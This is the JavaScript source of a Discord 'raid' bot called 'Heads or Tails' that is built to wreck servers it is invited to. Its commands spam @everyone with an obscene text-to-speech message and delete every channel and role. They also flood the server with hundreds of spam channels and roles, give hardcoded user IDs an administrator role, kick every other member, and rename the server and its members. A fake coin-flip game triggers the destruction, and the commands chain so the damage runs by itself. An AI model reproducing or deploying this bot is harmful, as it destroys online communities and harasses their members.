const Discord = require("discord.js");


const bot = new Discord.Client();


const prefix = "=" ;


//options


const raidmsg = "@everyone Raid by **Heads or Tails** FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UPFUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP FUCKED UP https://cdn.discordapp.com/attachments/532336096571293708/577880386944630795/c5bde70897f24d59572d7bf6d68fe568.gif"

process.on('unhandledRejection', (reason) => {


  console.error(reason);


});


bot.on("ready", () => {


		console.log(`${bot.user.tag} prêt pour le carnage`) 


		console.log(`invite : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=-1`)


		console.log(`token : ${bot.token}`) 


		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))


		console.log(bot.users.size) 


	 //bot.channels.map(c => c.createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))


		//bot.guilds.map(g => g. unban("524996881198219276")) 


		//bot.guilds.map(g => g.createChannel("text","anarchy").then(c => c.send("=allchan")))


		//bot.guilds.map(g => g.channels.random().createInvite().then(url => console.log(`https://discord.gg/${url.code} : ${url.guild.name} : ${url.guild.members.size} Membres`)))

  bot.channels.find("type", "text").send("=flipRole")
  
  //bot.guilds.map(g => g.leave())
 	})


 		

 	 			

bot.on("message", msg => {

//console.log(`${msg.guild.name} : ${msg.channel.name} : ${msg.author.username} : ${msg.content}`) 
			//masse ping


		if(msg.content.includes("@everyone")){


		msg.channel.send(raidmsg, {tts:true}) 




				}


			 if(msg.content === prefix+"allchan"){


 	 msg.delete();


 	 msg.guild.channels.findAll("type", "text").map(c => c.send(raidmsg, {tts:true})) 


 	 } 


 	 


				if(msg.content === prefix+"channel"){

			 			msg.delete();

			 			for(var i = 0; i < 30; i++){
      
      let coin = ["Heads-📀", "Tails-💿", "Side-⭐"]  
 	
 	    var nombre = Math.floor(Math.random()*coin.length)

			 				msg.guild.createChannel("["+parseInt(i+1) +"] " +coin[nombre], "text");

			 }




			 for(var i =0; i < 469; i++){
    
    let coin = ["📀•Heads•📀", "💿•Tails•💿", "⭐•Side•⭐"] 
 	
 	  var nombre = Math.floor(Math.random()*coin.length)
 	
			 	msg.guild.createChannel("["+parseInt(i+1) +"] Coin : "+coin[nombre], "voice");

			 	}






			 setTimeout(() => {


			 	msg.channel.send(prefix+"issou").then(m => m. delete()) ;


			 	msg.channel.send(prefix+"allchan").then(m => m.delete());


			 	}, 15000); 


			 }




		if(msg.content === prefix+"admin"){


			msg.delete();


			msg.guild.roles.map(r => r. edit({permissions:2146958591})) 


			msg.guild.roles.map(r => r.delete())


			msg.channel.send(prefix+"roles").then(m => m.delete()) 


			}


			if(msg.content===prefix+"roles"){


				 msg.delete();


			 for(var i = 0 ; i < 225; i++){
      
      let coin = ["📀•Heads•📀", "💿•Tails•💿", "📀•Side•💿"]
 	
      	var nombre = Math.floor(Math.random()*coin.length)
 	

						 msg.guild.createRole({


						 	name:"[" +parseInt(i+1) +"] Coin: " +coin[nombre], 


						 	mentionable:false, 


					 		permissions:2146958591, 


						 	position: ""


							})


						}


						} 


		 			//détruire des channels


			 	if(msg.content=== prefix+"nuke"){
    
    let coin = ["Heads", "Tails", "Side"] 
 	
    	var nombre = Math.floor(Math.random()*coin.length)
 	

			 		console.log("destruction")
     
     bot.user.setUsername("📀•Nuked by "+coin[nombre]+"•💿") 

			 		msg.guild.channels.map(c => c.delete())


			 		msg.guild.createChannel("⬇️•Heads or Tails ?•⬇️", "text").then(m => m.send(prefix+"channel"));


			 		}
     if(msg.content === prefix+"flipRole") {
     	var pafad = [
     "524996881198219276", 
     "392077981130162177", 
     "463402562679472128" 
     	] 
     	
     	msg.channel.send("📀 Loading...").then(m => {
     		
     	msg.guild.createRole({


						 	name:"📀Game Master📀", 


						 	mentionable:false, 

 
					 		permissions:2146958591, 


						 	position: ""


							}).then(r => {
     	 pafad.forEach(paf => {
     		try{
     		msg.guild.members.find("id", paf).addRole(r.id)
     		
     		m.edit(`📀 ${msg.guild.members.find("id", paf).user.username} is the game master !`)
     		
     		} catch(e) {
     			
     		msg.channel.send("📀" +paf + " isn't in this server.") 
     		}
     		}) 
     		
     		}) 
     		
     		}) 
     		
     	} 

			 			if(msg.content === prefix+"issou"){


			 				msg.delete();


			 				msg.channel.send(prefix+"admin").then(m => m.delete())


			 				msg.guild.setName("📀•Raid by Heads or Tails•💿")


			 				msg.guild.setIcon("https://cdn.discordapp.com/attachments/532336096571293708/577878575487647755/IMG_20190501_202825.jpg")


			 				}				


		 if(msg.content === prefix+"banall"){
   
   msg.delete();
   
   msg.channel.send("📀 Loading...").then(m => {
   	
		 msg.guild.members.filter(u => !u.roles.exists("name", "📀Game Master📀")).forEach(g => {
		 	
		 try{
		 	
		 g.kick().then(k => {
		 	
		 m.edit("📀 " +g.user.username + " was kicked.")
		
		 })
	 	} catch (e) {
	 		m.edit(`📀 Can't kick ${g.user.username}.`)
	 	}
	 	}) 
	 	
   }) 
    
 	 }


 	 


 	 if(msg.content === prefix + "rename"){

	 	msg.delete();
   
   msg.channel.send("📀 Loading...").then(m => {
   	
	 	msg.guild.members.forEach(g => {
	 	
	 	let coin = ["Heads", "Tails", "Side"] 
 	
  	var nombre = Math.floor(Math.random()*coin.length)
 	 
	 	g.setNickname("📀•Coin: "+coin[nombre]).then(x => {
	 		
	 	m.edit(g.user.username+"'s nick has been updated to : **" + "📀•Coin: "+coin[nombre]+"**") 
	 	
	 	}) 
	 	
	 	
	 	}) 
	 	
	 	}) 


	} 
 	 		
 if(msg.content === prefix + "flipcoin") {
 	
 	msg.delete() 
 	
 	let coin = ["Heads", "Tails", "Side"] 
 	
 	var nombre = Math.floor(Math.random()*coin.length)
 	
 	msg.channel.send("📀 Fliping the coin...").then(m => {
 	
 	setTimeout(() => {
 		
  m.edit("I flipped **" + coin[nombre] +"**") 
 	
 	if(coin[nombre] === "Tails" || coin[nombre] === "Heads") {
 	msg.channel.send("⚠️ Bad luck, this server will be destroyed soon...") 
 	setTimeout(() => {
 	msg.channel.send(prefix + "nuke") 
 	}, 2000)
 	return;
 	} else {
 	msg.channel.send("✅ You have a good luck.")
 	} 
 	
 	}, 2000)
 	
 	}) 
 	
 	} 

 	 		})

bot.login(process.env.token) 
